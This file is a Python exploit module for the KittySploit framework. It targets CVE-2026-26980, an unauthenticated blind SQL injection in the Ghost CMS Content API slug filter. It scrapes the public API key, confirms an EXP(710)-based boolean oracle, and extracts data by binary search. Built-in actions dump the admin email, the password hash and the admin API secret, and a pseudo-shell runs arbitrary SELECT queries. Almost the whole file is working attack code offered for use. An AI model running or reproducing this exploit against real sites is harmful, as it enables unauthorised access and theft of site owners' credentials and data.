#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-26980 — Ghost CMS Content API unauthenticated blind SQLi."""

import re
from typing import Optional
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.sqli import Sqli


class Module(Auxiliary, Http_client, Sqli):
    __info__ = {
        "name": "Ghost CMS CVE-2026-26980 Content API SQLi",
        "description": (
            "Exploits CVE-2026-26980: unauthenticated blind SQL injection in Ghost "
            "Content API slug filter ordering (3.24.0–6.19.0, fixed in 6.19.1). Uses "
            "the public Content API key and an EXP(710) MySQL boolean oracle "
            "(HTTP 200/500). Supports test, targeted dumps, and Sqli pseudo-shell."
        ),
        "author": ["Nicholas Carlini", "KittySploit Team"],
        "cve": ["CVE-2026-26980"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-26980",
            "https://github.com/TryGhost/Ghost/security/advisories/GHSA-w52v-v783-gw97",
            "https://www.sonicwall.com/blog/ghost-cms-content-api-blind-sql-injection"],
        "tags": [
            "ghost",
            "cms",
            "sqli",
            "blind",
            "unauthenticated",
            "mysql",
            "cve-2026-26980"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 80,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 1.5,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["ghost"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/ghost/api/content/"],
                "param_any": ["filter", "key"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(2368, "Ghost HTTP port (default 2368)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    base_path = OptString("/", "Ghost base path prefix", required=False)
    content_key = OptString(
        "",
        "Content API key (empty = scrape from HTML)",
        required=False,
    )
    action = OptString(
        "test",
        "Action: test | email | password | api_key | sql | shell",
        required=False,
    )
    # Sqli.single_sql already exists; keep alias via action=sql
    resource = OptString(
        "tags/",
        "Content API resource path used for injection (tags/ or posts/)",
        required=False,
        advanced=True,
    )
    max_length = OptInteger(256, "Max string length for blind extraction", required=False, advanced=True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self._key = ""
        self._slug = "news"

    def _timeout(self) -> int:
        return max(int(self.timeout or 20), 15)

    def _base(self) -> str:
        val = str(self.base_path or "/").strip() or "/"
        if not val.startswith("/"):
            val = "/" + val
        return val.rstrip("/") or ""

    def _path(self, suffix: str) -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base else suffix

    def _content_get(self, resource: str, params: dict):
        query = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in params.items())
        path = self._path(f"/ghost/api/content/{resource.lstrip('/')}")
        if query:
            path = f"{path}?{query}"
        return self.http_request(
            method="GET",
            path=path,
            headers={"Accept": "application/json"},
            timeout=self._timeout(),
            allow_redirects=False,
        )

    def _scrape_content_key(self) -> str:
        configured = str(self.content_key or "").strip()
        if configured:
            return configured
        for path in ("/", "/ghost/"):
            response = self.http_request(
                method="GET",
                path=self._path(path),
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response:
                continue
            text = response.text or ""
            match = re.search(r'data-key="([a-f0-9]{20,})"', text, re.I)
            if match:
                return match.group(1)
            match = re.search(
                r'["\']content[_-]?api[_-]?key["\']\s*[:=]\s*["\']([a-f0-9]{20,})["\']',
                text,
                re.I,
            )
            if match:
                return match.group(1)
        return ""

    def _enumerate_slug(self) -> str:
        resource = str(self.resource or "tags/").lstrip("/")
        response = self._content_get(
            resource,
            {"key": self._key, "filter": "slug:-null", "limit": "1"},
        )
        if response and response.status_code == 200:
            try:
                data = response.json() or {}
            except Exception:
                data = {}
            for key in ("tags", "posts", "pages", "authors"):
                rows = data.get(key) or []
                if rows and isinstance(rows[0], dict) and rows[0].get("slug"):
                    return str(rows[0]["slug"])
        return "news"

    def _sqli_filter(self, condition: str) -> str:
        payload = f"'||CASE WHEN {condition} THEN 0 ELSE EXP(710) END||'"
        return f"slug:[{payload},{self._slug}]"

    def oracle(self, condition: str) -> bool:
        resource = str(self.resource or "tags/").lstrip("/")
        filt = self._sqli_filter(condition)
        response = self._content_get(
            resource,
            {"key": self._key, "filter": filt},
        )
        return bool(response and response.status_code == 200)

    def verify(self) -> bool:
        return self.oracle("1=1") and not self.oracle("1=0")

    def _extract_length(self, query: str) -> int:
        lo, hi = 0, max(1, int(self.max_length or 256))
        while lo < hi:
            mid = (lo + hi) // 2
            if self.oracle(f"CHAR_LENGTH(({query})) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _extract_char(self, query: str, pos: int) -> str:
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ORD(SUBSTR(({query}) FROM {pos} FOR 1)) > {mid}"
            if self.oracle(cond):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo) if 32 <= lo <= 126 else "?"

    def extract(self, query: str, label: str = "value") -> str:
        print_status(f"Measuring length of {label}...")
        length = self._extract_length(query)
        print_info(f"Length: {length}")
        if length <= 0:
            return ""
        if length > int(self.max_length or 256):
            print_warning(f"Capping extraction at max_length={self.max_length}")
            length = int(self.max_length or 256)

        chars = []
        print_status(f"Extracting {label}...")
        for pos in range(1, length + 1):
            ch = self._extract_char(query, pos)
            chars.append(ch)
            print(ch, end="", flush=True)
        print()
        return "".join(chars)

    def sqli_fetch_scalar(self, user_line: str) -> Optional[str]:
        """Sqli mixin hook — boolean-blind extract a scalar expression/SELECT."""
        raw = (user_line or "").strip().rstrip(";")
        if not raw:
            return None
        if raw.upper().startswith("SELECT "):
            query = raw
        else:
            query = f"SELECT {raw}"
        # Ensure single scalar for CHAR_LENGTH/SUBSTR
        if not query.upper().startswith("SELECT "):
            query = f"SELECT ({query})"
        try:
            return self.extract(query, label=query[:60])
        except Exception as exc:
            print_error(f"Extraction failed: {exc}")
            return None

    def _ensure_ready(self) -> bool:
        self._key = self._scrape_content_key()
        if not self._key:
            print_error("Content API key not found (set content_key)")
            return False
        print_success(f"Content API key: {self._key[:8]}…{self._key[-4:]}")
        self._slug = self._enumerate_slug()
        print_info(f"Anchor slug: {self._slug}")
        return True

    def run(self):
        action = str(self.action or "test").strip().lower()
        print_status("CVE-2026-26980 — Ghost Content API slug filter SQLi")
        print_info(f"Target: {self.target}:{int(self.port)} action={action}")

        if not self._ensure_ready():
            return False

        print_status("Verifying boolean oracle (1=1 / 1=0)...")
        if not self.verify():
            print_error("Oracle failed — target likely patched or not MySQL")
            return False
        print_success("Boolean oracle confirmed — vulnerable")

        if action == "test":
            return True

        if action in ("shell",) or self.shell_sqli:
            print_status("Starting SQLi handler (shell_sqli)")
            self.shell_sqli = True
            self.handler_sqli()
            return True

        if action == "email":
            value = self.extract(
                "SELECT email FROM users ORDER BY id ASC LIMIT 1",
                "admin email",
            )
            if not value:
                print_error("No email extracted")
                return False
            print_success(f"Admin email: {value}")
            return True

        if action == "password":
            value = self.extract(
                "SELECT password FROM users ORDER BY id ASC LIMIT 1",
                "password hash",
            )
            if not value:
                print_error("No password hash extracted")
                return False
            print_success(f"Password hash: {value}")
            return True

        if action in ("api_key", "admin_key", "secret"):
            value = self.extract(
                "SELECT secret FROM api_keys WHERE type='admin' ORDER BY id ASC LIMIT 1",
                "admin API secret",
            )
            if not value:
                print_error("No admin API secret extracted")
                return False
            print_success(f"Admin API secret: {value}")
            return True

        if action == "sql":
            query = str(self.single_sql or "").strip()
            if not query:
                print_error("Set single_sql for action=sql")
                return False
            if not query.upper().startswith("SELECT "):
                query = f"SELECT {query}"
            value = self.extract(query, query[:60])
            if value is None or value == "":
                print_error("No data extracted")
                return False
            print_success(f"Result: {value}")
            return True

        print_error(f"Unknown action: {action}")
        print_info("Valid: test | email | password | api_key | sql | shell")
        return False
